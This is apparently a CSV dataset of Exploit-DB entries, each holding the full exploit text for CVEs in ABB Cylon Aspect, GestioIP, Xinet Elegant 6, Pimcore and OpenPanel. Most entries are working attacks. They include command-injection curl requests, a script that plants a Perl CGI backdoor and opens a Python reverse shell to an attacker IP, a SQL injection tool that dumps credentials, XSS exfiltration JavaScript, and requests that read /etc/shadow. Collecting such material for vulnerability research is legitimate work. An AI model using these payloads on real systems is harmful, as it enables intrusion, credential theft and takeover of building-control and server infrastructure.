CVE-2024-48839,"{""CVE-2024-48839"": 1}",2025-04-15,ABB Cylon Aspect 3.08.02 (uploadDb.php) - Remote Code Execution,https://www.exploit-db.com/exploits/52216,"ABB Cylon Aspect 3.08.02 (uploadDb.php) - Remote Code Execution Vendor: ABB Ltd. Product web page: <URL> Affected version: NEXUS Series, MATRIX-2 Series, ASPECT-Enterprise, ASPECT-Studio Firmware: <=3.08.02 Summary: ASPECT is an award-winning scalable building energy management and control solution designed to allow users seamless access to their building data through standard building protocols including smart devices. Desc: The ABB Cylon Aspect BMS/BAS controller suffers from an authenticated OS command injection vulnerability. This can be exploited to inject and execute arbitrary shell commands through the contents of an uploaded .db file, which is passed to the copyFile.sh script. Although the filename is sanitized, the contents of the .db file are not, allowing attackers to inject malicious commands that are executed on the server. Tested on: GNU/Linux 3.15.10 (armv7l) GNU/Linux 3.10.0 (x8664) GNU/Linux 2.6.32 (x8664) Intel(R) Atom(TM) Processor E3930 @ 1.30GHz Intel(R) Xeon(R) Silver 4208 CPU @ 2.10GHz PHP/7.3.11 PHP/5.6.30 PHP/5.4.16 PHP/4.4.8 PHP/5.3.3 AspectFT Automation Application Server lighttpd/1.4.32 lighttpd/1.4.18 Apache/2.2.15 (CentOS) OpenJDK Runtime Environment (rhel-2.6.22.1.-x86_64) OpenJDK 64-Bit Server VM (build 24.261-b02, mixed mode) ErgoTech MIX Deployment Server 2.0.0 Vulnerability discovered by Gjoko 'LiquidWorm' Krstic Advisory ID: ZSL-2025-5904 Advisory URL: <URL> CVE ID: CVE-2024-48839 CVE URL: CVE URL: <URL> 21.04.2024 $ cat project P R O J E C T $ curl -s <URL> \ > -H ""Cookie: PHPSESSID=xxx"" \ > -F ""userfile=.db"" $ curl <URL>"
CVE-2024-6516,"{""CVE-2024-6516"": 1}",2025-04-15,ABB Cylon Aspect 3.08.02 (bbmdUpdate.php) - Remote Code Execution,https://www.exploit-db.com/exploits/52217,"ABB Cylon Aspect 3.08.02 (bbmdUpdate.php) - Remote Code Execution Vendor: ABB Ltd. Product web page: <URL> Affected version: NEXUS Series, MATRIX-2 Series, ASPECT-Enterprise, ASPECT-Studio Firmware: <=3.08.02 Summary: ASPECT is an award-winning scalable building energy management and control solution designed to allow users seamless access to their building data through standard building protocols including smart devices. Desc: The ABB Cylon Aspect BMS/BAS controller suffers from an authenticated blind command injection vulnerability. Input passed to several POST parameters is not properly sanitized when writing files, allowing attackers to execute arbitrary shell commands on the system. There is also an off-by-one error in array access that could lead to undefined behavior and potential DoS. Tested on: GNU/Linux 3.15.10 (armv7l) GNU/Linux 3.10.0 (x8664) GNU/Linux 2.6.32 (x8664) Intel(R) Atom(TM) Processor E3930 @ 1.30GHz Intel(R) Xeon(R) Silver 4208 CPU @ 2.10GHz PHP/7.3.11 PHP/5.6.30 PHP/5.4.16 PHP/4.4.8 PHP/5.3.3 AspectFT Automation Application Server lighttpd/1.4.32 lighttpd/1.4.18 Apache/2.2.15 (CentOS) OpenJDK Runtime Environment (rhel-2.6.22.1.-x86_64) OpenJDK 64-Bit Server VM (build 24.261-b02, mixed mode) ErgoTech MIX Deployment Server 2.0.0 Vulnerability discovered by Gjoko 'LiquidWorm' Krstic Advisory ID: ZSL-2025-5903 Advisory URL: <URL> CVE ID: CVE-2024-48839, CVE-2024-6516, CVE-2024-51550 CVE URL: <URL> 21.04.2024 $ cat project P R O J E C T $ curl <URL> \ > -H ""Cookie: PHPSESSID=xxx"" \ > -d ""rowCount=2&\ > ip1=192.168.1.1&\ > port1=47808&\ > hexMask1=0xFFFF&\ > remove1=0&\ > ip2=192.168.1.2&\ > port2=47809&\ > hexMask2=0xFFFF; sleep 17; #&\ > remove2=0&\ > submit=Submit $ curl <URL> \ > -H ""Cookie: PHPSESSID=xxx"" \ > -d ""rowCountNAT=2&\ > NATip1=192.168.1.1&\ > NATport1=2222&\ > NAThexMask1=0xFFFF&\ > NATremove1=7&\ > NATip2=192.168.1.2&\ > NATport2=2223&\ > NAThexMask2=0xFFFF; sleep 17; #&\ > NATremove2=0&\ > submit=Submit"
CVE-2024-48844,"{""CVE-2024-48844"": 1}",2025-04-15,ABB Cylon Aspect 3.08.02 (escDevicesUpdate.php) - Denial of Service (DOS),https://www.exploit-db.com/exploits/52218,"ABB Cylon Aspect 3.08.02 (escDevicesUpdate.php) Off-by-One Config Write DoS Vendor: ABB Ltd. Product web page: <URL> Affected version: NEXUS Series, MATRIX-2 Series, ASPECT-Enterprise, ASPECT-Studio Firmware: <=3.08.02 Summary: ASPECT is an award-winning scalable building energy management and control solution designed to allow users seamless access to their building data through standard building protocols including smart devices. Desc: A vulnerability was identified in a PHP script where an off-by-one error in array access could lead to undefined behavior and potential DoS. The issue arises in a loop that iterates over an array using a < condition, allowing access to an out-of-bounds index. This can trigger errors or unexpected behavior when processing data, potentially crashing the application. Successful exploitation of this vulnerability can lead to a crash or disruption of service, especially if the script handles large data sets. This issue can be triggered via the rowCount POST parameter in the Electronic Security Control device update script. Tested on: GNU/Linux 3.15.10 (armv7l) GNU/Linux 3.10.0 (x8664) GNU/Linux 2.6.32 (x8664) Intel(R) Atom(TM) Processor E3930 @ 1.30GHz Intel(R) Xeon(R) Silver 4208 CPU @ 2.10GHz PHP/7.3.11 PHP/5.6.30 PHP/5.4.16 PHP/4.4.8 PHP/5.3.3 AspectFT Automation Application Server lighttpd/1.4.32 lighttpd/1.4.18 Apache/2.2.15 (CentOS) OpenJDK Runtime Environment (rhel-2.6.22.1.-x8664) OpenJDK 64-Bit Server VM (build 24.261-b02, mixed mode) ErgoTech MIX Deployment Server 2.0.0 Vulnerability discovered by Gjoko 'LiquidWorm' Krstic Advisory ID: ZSL-2025-5902 Advisory URL: <URL> CVE ID: CVE-2024-48844 CVE URL: <URL> 21.04.2024 $ cat project P R O J E C T $ curl <URL> \ > -H ""Cookie: PHPSESSID=xxx"" \ > -d ""rowCount=2511531337&\ > escid1=192.168.1.1&\ > remove1=0&\ > escid2=192.168.1.AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&\ > remove2=0&\ > etc. > etc. $ cat escDevicesUpdate.php $ini = INI::read($comproperties); unset($ini['comm']['esc-ip-addr']); $rowCount = $POST['rowCount']; for ($i = 1; $i < $rowCount; $i++) { $fieldEscid = ""escid"" . $i; $fieldRemove = ""remove"" . $i; if ($POST[$fieldRemove] != 1) { $escid = trim($POST[$fieldEscid]); $ini['comm']['esc-ip-addr'][$i] = $escid; if (!INI::write($comproperties, $ini)) { logWarning(""ESC device listt modification FAILED""); $myLine = LINE; errorCall($myLine);"
CVE-2024-48845,"{""CVE-2024-48845"": 1}",2025-04-15,ABB Cylon Aspect 3.07.02 (userManagement.php) - Weak Password Policy,https://www.exploit-db.com/exploits/52221,"ABB Cylon Aspect 3.07.02 (userManagement.php) - Weak Password Policy Vendor: ABB Ltd. Product web page: <URL> Affected version: NEXUS Series, MATRIX-2 Series, ASPECT-Enterprise, ASPECT-Studio Firmware: <=3.07.02 Summary: ASPECT is an award-winning scalable building energy management and control solution designed to allow users seamless access to their building data through standard building protocols including smart devices. Desc: The ABB BMS/BAS controller suffers from a weak password policy, allowing users to set overly simplistic or blank passwords and usernames without restrictions. This vulnerability significantly reduces account security, enabling attackers to exploit weak credentials for unauthorized access to the system. Tested on: GNU/Linux 3.15.10 (armv7l) GNU/Linux 3.10.0 (x8664) GNU/Linux 2.6.32 (x8664) Intel(R) Atom(TM) Processor E3930 @ 1.30GHz Intel(R) Xeon(R) Silver 4208 CPU @ 2.10GHz PHP/7.3.11 PHP/5.6.30 PHP/5.4.16 PHP/4.4.8 PHP/5.3.3 AspectFT Automation Application Server lighttpd/1.4.32 lighttpd/1.4.18 Apache/2.2.15 (CentOS) OpenJDK Runtime Environment (rhel-2.6.22.1.-x86_64) OpenJDK 64-Bit Server VM (build 24.261-b02, mixed mode) ErgoTech MIX Deployment Server 2.0.0 Vulnerability discovered by Gjoko 'LiquidWorm' Krstic Advisory ID: ZSL-2024-5898 Advisory URL: <URL> CVE ID: CVE-2024-48845 CVE URL: <URL> 21.04.2024 P R O J E C T"
CVE-2024-51546,"{""CVE-2024-51546"": 1}",2025-04-15,ABB Cylon Aspect 3.08.02 - Cookie User Password Disclosure,https://www.exploit-db.com/exploits/52224,"ABB Cylon Aspect 3.08.02 - Cookie User Password Disclosure Vendor: ABB Ltd. Product web page: <URL> Affected version: NEXUS Series, MATRIX-2 Series, ASPECT-Enterprise, ASPECT-Studio Firmware: <=3.08.02 Summary: ASPECT is an award-winning scalable building energy management and control solution designed to allow users seamless access to their building data through standard building protocols including smart devices. Desc: The application suffers from cleartext transmission and storage of sensitive information in a Cookie. This includes the globals parameter, where authdata contains base64-encoded credentials. A remote attacker can intercept the HTTP Cookie, including authentication credentials, through a man-in-the-middle attack, potentially compromising user accounts and sensitive data. Tested on: GNU/Linux 3.15.10 (armv7l) GNU/Linux 3.10.0 (x8664) GNU/Linux 2.6.32 (x8664) Intel(R) Atom(TM) Processor E3930 @ 1.30GHz Intel(R) Xeon(R) Silver 4208 CPU @ 2.10GHz PHP/7.3.11 PHP/5.6.30 PHP/5.4.16 PHP/4.4.8 PHP/5.3.3 AspectFT Automation Application Server lighttpd/1.4.32 lighttpd/1.4.18 Apache/2.2.15 (CentOS) OpenJDK Runtime Environment (rhel-2.6.22.1.-x86_64) OpenJDK 64-Bit Server VM (build 24.261-b02, mixed mode) ErgoTech MIX Deployment Server 2.0.0 Vulnerability discovered by Gjoko 'LiquidWorm' Krstic Advisory ID: ZSL-2025-5895 Advisory URL: <URL> CVE ID: CVE-2024-51546 CVE URL: <URL> 21.04.2024 $ cat project P R O J E C T Cookie: PHPSESSID=xxx; context1=xxx; globals={""currentUser"":{""username"":""aamuser"",""authdata"":""YWFtdXNlcjpkZWZhdWx0"",""mangledAuth"":""bXVidmZnO2Vmc3Z0Ym45YjczMzY2ODo6MjQyODQ7Mg=="",""loginExpirySeconds"":0},""loggedIn"":true,""lang"":""en""}; cod=5.27; connect.sid=xxx; csd=44"
CVE-2024-50858,"{""CVE-2024-50858"": 1}",2025-04-14,GestioIP 3.5.7 - Cross-Site Request Forgery (CSRF),https://www.exploit-db.com/exploits/52200,"Exploit Title: GestioIP 3.5.7 - GestioIP Vulnerability: Auth. Cross-Site Request Forgery (CSRF) Exploit Author: m4xth0r (Maximiliano Belino) Author website: <URL> Author email : max.cybersecurity at belino.com GitHub disclosure link: <URL> Date: 2025-01-13 Vendor Homepage: <URL> Software Link: <URL> Version: GestioIP v3.5.7 Tested on: Kali Linux CVE: CVE-2024-50858 Description The GestioIP application has many endpoints and they are vulnerable to CSRF. This allows an attacker to execute actions through the admin's browser on the application if the admin visits a malicious URL hosted by the attacker. These actions can modify, delete, or exfiltrate data from the application. Prerequisites The option ""Manage - Manage GestioIP - User Management"" must be enabled previously. Usage To exploit this vulnerability, an attacker must host <CODE> on an attacker-controlled web server (python3 -m http.server 8090). When an authenticated administrator goes to the attacker's website, the CSRF will execute making the attacker an administrator. File: payload.html example: editing user named 'maxi' Welcome to our site Thank you for visiting our site! We are processing your request, please wait a moment."
CVE-2024-50861,"{""CVE-2024-50861"": 1}",2025-04-14,GestioIP 3.5.7 - Stored Cross-Site Scripting (Stored XSS),https://www.exploit-db.com/exploits/52201,"Exploit Title: GestioIP 3.5.7 - GestioIP Vulnerability: Auth. Stored Cross-Site Scripting Exploit Author: m4xth0r (Maximiliano Belino) Author website: <URL> Author email: max.cybersecurity at belino.com GitHub disclosure link: <URL> Date: 2025-01-13 Vendor Homepage: <URL> Software Link: <URL> Version: GestioIP v3.5.7 Tested on: Kali Linux CVE: CVE-2024-50861 Description The <URL> feature of GestioIP 3.5.7 is vulnerable to Stored XSS. An authenticated attacker with appropriate permissions can inject malicious code into the tsigkey form field and save it to the database. Once saved, any user who accesses the ""DNS Key"" page will trigger the Stored XSS, leading to the execution of malicious code. Prerequisites 1. Enable ""DNS Key"" Feature First, ensure that ""Dynamic DNS updates"" is enabled in the global configuration: Manage > Manage GestioIP > Global Configuration > Dynamic DNS updates enabled: yes This will enable the following menus: Manage > DNS Keys Manage > DNS Update User 2. Create a DNS Key Entry To create a new DNS key entry and also edit an existing one, the user must belong to a group with the ""Manage Sites And Categories"" permission. By default, ""Admin"" and ""GestioIP Admin"" groups have this permission. Also, you can configure this permission to any group under: Manage > User Groups > Manage Sites and Categories 3. Enter payload. Once group permission is set, input one of the following payloads into the ""TSIG Key"" (tsigkey) field and save it. Payloads 1 - Test basic XSS 2 - Send data (cookies) to the attacker's server 3 - Redirect the user to a malicious site"
CVE-2024-50859,"{""CVE-2024-50859"": 1}",2025-04-14,GestioIP 3.5.7 - Reflected Cross-Site Scripting (Reflected XSS),https://www.exploit-db.com/exploits/52202,"Exploit Title: GestioIP 3.5.7 - Reflected Cross-Site Scripting (Reflected XSS) Exploit Author: m4xth0r (Maximiliano Belino) Author website: <URL> Author email (max.cybersecurity at belino.com) GitHub disclosure link: <URL> Date: 2025-01-13 Vendor Homepage: <URL> Software Link: <URL> Version: GestioIP v3.5.7 Tested on: Kali Linux CVE: CVE-2024-50859 Description The ipimportaclcsv request is vulnerable to Reflected XSS (Reflected Cross-Site Scripting); the user can upload a file and the file content is reflected in the HTML response without being sanitized. If the file uploaded by the user has an incorrect format and an error occurs during its processing, part of the file's content may be displayed in the browser. If this content includes HTML or scripts and it is not properly escaped, the browser could interpret it, leading to a security vulnerability. This could allow data exfiltration and enabling CSRF (Cross-Site Request Forgery) attacks. Proper input validation and output encoding are critical to prevent this vulnerability. Prerequisites Enable (set to 'yes') the parameter: Manage > Manage GestioIP > ACL connection management Usage Select: import/export > Import ACLs/ACL Connections Select: ""Connection List"" Select ""report only"" Browse to select the file you want to upload. Click 'upload' Payloads 1) html file to upload 2) js file to exfiltrate data var req1 = new XMLHttpRequest(); req1.open('GET',"" <URL> false); req1.send(); response = req1.responseText; var req2 = new XMLHttpRequest(); req2.open('POST', "" <URL> false); req2.setRequestHeader('Content-Type', 'text/html'); req2.send(response);"
CVE-2024-50857,"{""CVE-2024-50857"": 1}",2025-04-14,GestioIP 3.5.7 - Cross-Site Scripting (XSS),https://www.exploit-db.com/exploits/52203,"Exploit Title: GestioIP 3.5.7 - GestioIP Vulnerability: Auth. Cross-Site Scripting (XSS) Exploit Author: m4xth0r (Maximiliano Belino) Author website: <URL> Author email (max.cybersecurity at belino.com) GitHub disclosure link: <URL> Date: 2025-01-13 Vendor Homepage: <URL> Software Link: <URL> Version: GestioIP v3.5.7 Tested on: Kali Linux CVE: CVE-2024-50857 Description The ""ip_do_job"" feature of GestioIP 3.5.7 is vulnerable to XSS, leading to data exfiltration and CSRF attacks. Two examples are described below. Prerequisites To successfully exploit the XSS vulnerability, the user must be part of a ""User Group"" that has the following three permissions: • Show backuped device configurations (readdeviceconfigperm) • Upload device configurations (writedeviceconfigperm) • Administrate CM (administrativecmperm) 1) vulnerable parameter: host_id <URL> ' 2) vulnerable parameter: stored_config <URL> '"
CVE-2024-48760,"{""CVE-2024-48760"": 1}",2025-04-14,GestioIP 3.5.7 - Remote Command Execution (RCE),https://www.exploit-db.com/exploits/52204,"Exploit Title: GestioIP 3.5.7 - Remote Command Execution (RCE) Exploit Author: m4xth0r (Maximiliano Belino) Author website: <URL> Author email (max.cybersecurity at belino.com) GitHub disclosure link: <URL> Date: 2025-01-13 Vendor Homepage: <URL> Software Link: <URL> Version: GestioIP v3.5.7 Tested on: Kali Linux CVE: CVE-2024-48760 import requests import sys Config username = ""gipadmin"" password = ""PASSWORD"" domain = ""localhost"" localip = ""10.20.0.1"" localport = 443 targeturl = f"" <URL> CGI Backdoor Perl backdoorcode = ""#!/usr/bin/perl -w use strict; print ""Cache-Control: no-cache\\n""; print ""Content-type: text/html\\n\\n""; my $req = $ENV{QUERYSTRING}; chomp ($req); $req =~ s/%20/ /g; $req =~ s/%3b/;/g; $req =~ s/%7c/|/gi; $req =~ s/%27/'/g; $req =~ s/%22/""/g; $req =~ s/%5D/]/g; $req =~ s/%5B/[/g; print "" ""; print ' '; if (!$req) { print ""Usage: <URL> } else { print ""Executing: $req""; print "" ""; my = `$req`; print "" ""; foreach my $line () { print $line . "" ""; print "" ""; Exploit functions def uploadfile(session, filename, filedata): ""Uploads the file to the server"" files = { 'filename': (None, filename), 'leasesfile': (filename, filedata) response = session.post(targeturl, files=files) if ""OK"" not in response.text: print(f""[!] Error uploading {filename}."") sys.exit(1) return response def runcommand(session, cmd): ""Execute a command in the server through the vuln"" url = targeturl + '?' + cmd resp = session.get(url) print(resp.text) def backdoorexists(session): ""Verifies if backdoor is already uploaded or not"" response = session.get(targeturl + ""?whoami"") if ""www-data"" in response.text: return True backdoor already uploaded return False backdoor not uploaded yet if name == 'main': with requests.Session() as session: session.auth = (username, password) Verify if backdoor is already uploaded if not backdoorexists(session): print(""\n[!] Uploading backdoor.\n"") uploadfile(session, 'upload.cgi', backdoorcode) else: print(""\n[+] Backdoor already uploaded. Continue.\n"") Execute the reverse shell print(""\n[!] Executing reverse shell.\n"") reverseshellcmd = f'python3 -c ""import socket, subprocess, os; s=socket.socket(socket.AFINET, socket.SOCKSTREAM); s.connect((\'{localip}\', {localport})); os.dup2(s.fileno(), 0); os.dup2(s.fileno(), 1); os.dup2(s.fileno(), 2); p=subprocess.call([\'/bin/sh\', \'-i\']);""' runcommand(session, reverseshell_cmd)"
CVE-2019-19245,"{""CVE-2019-19245"": 1}",2025-04-14,Xinet Elegant 6 Asset Lib Web UI 6.1.655 - SQL Injection,https://www.exploit-db.com/exploits/52192,"Exploit Title: Xinet Elegant 6 Asset Lib Web UI 6.1.655 - SQL Injection Exploit author: hyp3rlinx import requests,time,re,sys,argparse NAPC Xinet Elegant 6 Asset Library v6.1.655 Pre-Auth SQL Injection 0day Exploit By hyp3rlinx ApparitionSec UPDATED: Jan 2024 for python3 TODO: add SSL support This will dump tables, usernames and passwords in vulnerable versions REQUIRE PARAMS: LoginForm[password]=&LoginForm[rememberMe]=0&LoginForm[username]=SQL&yt0 SQL INJECTION VULN PARAM --> LoginForm[username] IP="""" PORT=""80"" URL="""" NUMINJECTS=20 k=1 j=0 TABLES=False CREDS=False SHOWSQLERROR=False def vulnverchk(): global IP, PORT TARGET = "" <URL> response = requests.get(TARGET) if re.findall(r'\bElegant"",appVersion:""6.1.655\b', response.content.decode()): print(""[+] Found vulnerable NAPC Elegant 6 Asset Library version 6.1.655."") return True print(""[!] Version not vulnerable :("") return False def sqlinjectrequest(SQL): global IP, PORT URL = "" <URL> tmp="""" headers = {'User-Agent': 'Mozilla/5.0'} payload = {'LoginForm[password]':'1','LoginForm[rememberMe]':'0','LoginForm[username]':SQL} session = requests.Session() res = session.post(URL,headers=headers,data=payload) idx = res.content.decode('utf-8').find('CDbCommand') Start of SQL Injection Error in response idx2 = res.content.decode('utf-8').find('key 1') End of SQL Injection Error in response return res.content[idx : idx2+3] Increments SQL LIMIT clause 0,1, 1,2, 1,3 etc def inc(): global k,j while j < NUMINJECTS: j+=1 if k !=1: k+=1 return str(j)+','+str(k) def tidyup(results): global CREDS idx = results.find(""'"".encode()) if idx != -1: idx2 = results.rfind(""'"".encode()) if not CREDS: return results[idx + 1: idx2 -2] else: return results[idx + 2: idx2] def breach(i): global k,j,NUMINJECTS,SHOWSQLERROR result="""" Dump Usernames & Passwords if CREDS: if i % 2 == 0: target='username' else: target='password' SQL=('""and (select 1 from(select count(),concat((select(select concat(0x2b,'+target+'))' 'from user limit '+str(i)+', 1),floor(rand(0)2))x from user group by x)a)-- -') if not SHOWSQLERROR: result = tidyup(sqlinjectrequest(SQL)) if result: result = result.decode() else: result = sqlinjectrequest(SQL)+""\n"" if result: result = result.decode() print(""[+] Dumping ""+str(target)+"": ""+str(result)) Dump Tables if TABLES: while j < NUMINJECTS: nums = inc() SQL=('""and (select 1 from (Select count(),Concat((select table_name from information_schema.tables where table_schema=database()' 'limit '+nums+'),0x3a,floor(rand(0)2))y from informationschema.tables group by y) x)-- -') if not SHOWSQLERROR: result = tidyup(sqlinjectrequest(SQL)) else: result = sqlinjectrequest(SQL) + ""\n"" if result: print(""[+] Dumping Table. "" +str(result.decode() time.sleep(0.3) def parseargs(): parser = argparse.ArgumentParser() parser.addargument(""-i"", ""--ipaddress"", help="" ."") parser.addargument(""-p"", ""--port"", help=""Port, Default is 80"") parser.addargument(""-t"", ""--gettables"", nargs=""?"", const=""1"", help=""Dump Database Tables."") parser.addargument(""-c"", ""--creds"", nargs=""?"", const=""1"", help=""Dump Database Credentials."") parser.addargument(""-m"", ""--maxinjects"", nargs=""?"", const=""1"", help=""Max SQL Injection Attempts, Default is 20."") parser.addargument(""-s"", ""--showsqlerrors"", nargs=""?"", const=""1"", help=""Display SQL Errors, Default is Clean Dumps."") parser.addargument(""-e"", ""--examples"", nargs=""?"", const=""1"", help=""Show script usage."") return parser.parseargs() def usage(): print(""Dump first ten rows of usernames and passwords"") print(""NAPC-Elegant-6-SQL-Exploit.py -i -c -m 10\n"") print(""\nDump first five rows of database tables and show SQL errors"") print(""NAPC-Elegant-6-SQL-Exploit.py -i -t -m 5 -s\n"") print(""NAPC-Elegant-6-SQL-Exploit.py -i -p80 -t -c -m30\n"") exit(0) def main(args): global TABLES,CREDS,URL,IP,NUMINJECTS,SHOWSQLERROR if args.ipaddress: IP=args.ipaddress if args.port: PORT=args.port if args.gettables: TABLES=True if args.creds: CREDS=True if args.maxinjects: NUMINJECTS = int(args.maxinjects) if args.showsqlerrors: SHOWSQLERROR=True if args.examples: usage() if vulnverchk(): for i in range(0, NUMINJECTS): breach(i) time.sleep(0.3) if name=='main': parser = argparse.ArgumentParser() print(""NAPC Elegant 6 Asset Library v6.1.655"") print(""Pre-Authorization SQL Injection 0day Exploit"") print(""Discovery / eXploit By hyp3rlinx"") print(""ApparitionSec\n"") time.sleep(0.5) if len(sys.argv)== 1: parser.printhelp(sys.stderr) sys.exit(0) main(parseargs())"
CVE-2024-11956,"{""CVE-2024-11956"": 1}",2025-04-14,Pimcore customer-data-framework 4.2.0 -  SQL injection,https://www.exploit-db.com/exploits/52193,"Exploit Title: Pimcore customer-data-framework 4.2.0 - SQL injection Date: 01/28/2025 Exploit Author: maeitsec Vendor Homepage: <URL> Software Link: <URL> Version: Pimcore versions prior to 10.5.21 Tested on: Ubuntu 20.04 with Pimcore 10.5.20 CVE: CVE-2024-11956 import requests Replace with target URL and credentials TARGETURL = "" <URL> USERNAME = ""lowprivilegeuser"" PASSWORD = ""password123"" Authenticate and get session session = requests.Session() logindata = { ""username"": USERNAME, ""password"": PASSWORD loginresponse = session.post(f""{TARGETURL}/admin/login"", data=logindata) if ""Login successful"" in loginresponse.text: print(""[+] Authenticated successfully."") Exploit the downloadAsZip functionality downloadurl = f""{TARGETURL}/admin/asset/download-as-zip"" payload = { ""ids[]"": [""1"", ""2"", ""3""] Replace with IDs of restricted files/folders downloadresponse = session.post(downloadurl, data=payload) if downloadresponse.statuscode == 200: print(""[+] Exploit successful. Restricted files downloaded."") with open(""restrictedfiles.zip"", ""wb"") as f: f.write(downloadresponse.content) else: print(""[-] Exploit failed. Server returned:"", downloadresponse.statuscode) else: print(""[-] Authentication failed."")"
CVE-2024-11954,"{""CVE-2024-11954"": 1}",2025-04-14,Pimcore 11.4.2 - Stored cross site scripting,https://www.exploit-db.com/exploits/52194,"Exploit Title: Authenticated Stored Cross-Site Scripting (XSS) Via Search Document Google Dork: N/A Date: 1/28/2025 Exploit Author: maeitsec Vendor Homepage: <URL> Software Link: <URL> Version: Pimcore 10.5.x (prior to 10.5.21) and 11.x (prior to 11.1.1) Tested on: Pimcore 10.5.20 on Ubuntu 20.04 CVE: CVE-2024-11954 Description: A stored Cross-Site Scripting (XSS) vulnerability exists in Pimcore's Data Object Classification Store functionality. The vulnerability arises due to insufficient input sanitization, allowing an authenticated attacker with access to the classification store to inject malicious JavaScript code. This code is then executed in the context of other users' browsers when they view the affected data. Proof of Concept ("
CVE-2024-53537,"{""CVE-2024-53537"": 1}",2025-04-14,OpenPanel 0.3.4 - Directory Traversal,https://www.exploit-db.com/exploits/52195,"Exploit Title: OpenPanel 0.3.4 - Directory Traversal Date: Dec 05, 2024 Exploit Author: Korn Chaisuwan, Punthat Siriwan, Pongtorn Angsuchotmetee Vendor Homepage: <URL> Software Link: <URL> Version: 0.3.4 Tested on: macOS CVE : CVE-2024-53537 Compress Function POST /compressfiles HTTP/2 Host: demo.openpanel.org:2083 Cookie: session=eyJ1c2VyX2lkIjoxfQ.ZyyFtw.LmzkwVp2FFx2AkdK5DVKigeef8 User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:132.0) Gecko/20100101 Firefox/132.0 Accept: / Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate, br Referer: <URL> Content-Type: application/x-www-form-urlencoded; charset=UTF-8 X-Requested-With: XMLHttpRequest Content-Length: 96 Origin: <URL> Sec-Fetch-Dest: empty Sec-Fetch-Mode: cors Sec-Fetch-Site: same-origin Priority: u=0 Te: trailers archiveName=/home/stefan/test/test3&selectedFiles%5B%5D=shadow&pathParam=../../etc&extension=tar Copy Function POST /copyitem?itemname=shadow&pathparam=/etc&itemtype=text%2Fplain&destinationpath=/home/stefan/ HTTP/2 Host: demo.openpanel.org:2083 Cookie: session=eyJ1c2VyX2lkIjoxfQ.ZyyFtw.LmzkwVp2FFx2AkdK5DVKigeef8 User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:132.0) Gecko/20100101 Firefox/132.0 Accept: / Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate, br Referer: <URL> Origin: <URL> Sec-Fetch-Dest: empty Sec-Fetch-Mode: cors Sec-Fetch-Site: same-origin Priority: u=0 Content-Length: 0 Te: trailers Download Function GET /downloadfile/shadow?pathparam=/etc HTTP/2 Host: demo.openpanel.org:2083 Cookie: session=eyJ1c2VyX2lkIjoxfQ.ZyyFtw.LmzkwVp2FFx2AkdK5DVKigeef8 User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:132.0) Gecko/20100101 Firefox/132.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate, br Referer: <URL> Upgrade-Insecure-Requests: 1 Sec-Fetch-Dest: document Sec-Fetch-Mode: navigate Sec-Fetch-Site: same-origin Sec-Fetch-User: ?1 Priority: u=0, i Te: trailers View Function GET /viewfile?filename=shadow&pathparam=/etc HTTP/2 Host: demo.openpanel.org:2083 Cookie: session=eyJ1c2VyX2lkIjoxfQ.ZyyFtw.LmzkwVp2FFx2AkdK5DVKigeef8 User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:132.0) Gecko/20100101 Firefox/132.0 Accept: / Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate, br Referer: <URL> Sec-Fetch-Dest: empty Sec-Fetch-Mode: cors Sec-Fetch-Site: same-origin Priority: u=0 Te: trailers"
CVE-2024-53582,"{""CVE-2024-53582"": 1}",2025-04-14,OpenPanel 0.3.4 - Incorrect Access Control,https://www.exploit-db.com/exploits/52196,"Exploit Title: OpenPanel 0.3.4 - Incorrect Access Control Date: Nov 25, 2024 Exploit Author: Korn Chaisuwan, Punthat Siriwan, Pongtorn Angsuchotmetee Vendor Homepage: <URL> Software Link: <URL> Version: 0.3.4 Tested on: macOS CVE : CVE-2024-53582 GET /files/../.. HTTP/2 Host: demo.openpanel.org:2083 Cookie: session=eyJ1c2VyX2lkIjoxfQ.ZyyEag.70MOWk6Q4cZWoRbciZO94dsGxgw User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:132.0) Gecko/20100101 Firefox/132.0 Accept: / Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate, br Referer: <URL> X-Requested-With: XMLHttpRequest Sec-Fetch-Dest: empty Sec-Fetch-Mode: cors Sec-Fetch-Site: same-origin Priority: u=0 Te: trailers"
CVE-2024-53584,"{""CVE-2024-53584"": 1}",2025-04-14,OpenPanel 0.3.4 - OS Command Injection,https://www.exploit-db.com/exploits/52197,"Exploit Title: OpenPanel 0.3.4 - OS Command Injection Date: Nov 25, 2024 Exploit Author: Korn Chaisuwan, Punthat Siriwan, Pongtorn Angsuchotmetee Vendor Homepage: <URL> Software Link: <URL> Version: 0.3.4 Tested on: macOS CVE : CVE-2024-53584 POST /server/timezone HTTP/2 Host: demo.openpanel.org:2083 Cookie: minimenu=0; session=eyJfZnJlc2giOmZhbHNlLCJ1c2VyX2lkIjozfQ.ZyyaKQ.HijWQTQI0yftDYEqqqqRRFuRU; theme=dark User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:132.0) Gecko/20100101 Firefox/132.0 Accept: / Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate, br Referer: <URL> Content-Type: application/x-www-form-urlencoded Content-Length: 51 Origin: <URL> Sec-Fetch-Dest: empty Sec-Fetch-Mode: cors Sec-Fetch-Site: same-origin Priority: u=0 Te: trailers timezone=;cat+/etc/shadow+>+/home/stefan/secret.txt"
